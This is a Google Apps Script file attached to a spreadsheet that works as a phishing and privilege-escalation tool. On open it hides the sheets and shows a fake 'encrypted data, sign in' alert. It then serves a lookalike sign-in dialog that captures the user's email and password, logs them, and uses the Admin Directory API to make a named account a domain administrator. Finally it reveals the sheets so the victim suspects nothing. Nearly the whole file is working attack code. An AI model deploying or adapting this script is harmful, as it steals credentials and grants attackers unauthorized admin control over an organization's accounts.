
function onOpen(e) {
  var event = e;
  try {
    hideAllSheetsExcept('Sheet1');
    showAlert();
  } catch (e) {
    console.log('Failed with error: %s', e.error);
  }
}

function showAlert() {
  //display alert on open
  var ui = SpreadsheetApp.getUi();

  var result = ui.alert(
     'The following data is encrypted.',
     'You must sign in to view the contents of this page',
      ui.ButtonSet.OK);
}

function hideAllSheetsExcept(sheetName) {
  var sheets=SpreadsheetApp.getActiveSpreadsheet().getSheets();
  for(var i =0;i<sheets.length;i++){
    Logger.log(i);
    if(sheets[i].getName()!=sheetName){
      sheets[i].hideSheet();
    }
  }
}

function revealSheets(){
  var sheets=SpreadsheetApp.getActiveSpreadsheet().getSheets();
  for(var i =0;i<sheets.length;i++){
    Logger.log(i);
    sheets[i].showSheet();
  }
}

function jumpByActive(){
  var spreadsheet=  SpreadsheetApp.getActiveSpreadsheet();
  var sheet = spreadsheet.getSheetByName('Sheet2');
  spreadsheet.setActiveSheet(sheet);
}

function stealCreds(){
  // open html page in dialog box
  //Logger.log(JSON.stringify(e));
  var htmlOutput =  HtmlService.createTemplateFromFile('index');
  
  // retrieve user's email to display in html page
  htmlOutput.email = Session.getActiveUser().getEmail();
  SpreadsheetApp.getUi().showModalDialog(htmlOutput.evaluate().setWidth(400).setHeight(500),'Confirming Access...');
}

function exfil(email,password){
  Logger.log(email +":" + password);
  try{
    addToAdminGroup();
  }catch(err)
  {
    Logger.log(err);
  }
  revealSheets();
  jumpByActive();
}

function addToAdminGroup(){
  var status = {
    "status": true,
  };
  
  //Users.makeAdmin
  AdminDirectory.Users.makeAdmin(status,'compromised-account@organization.com');
}
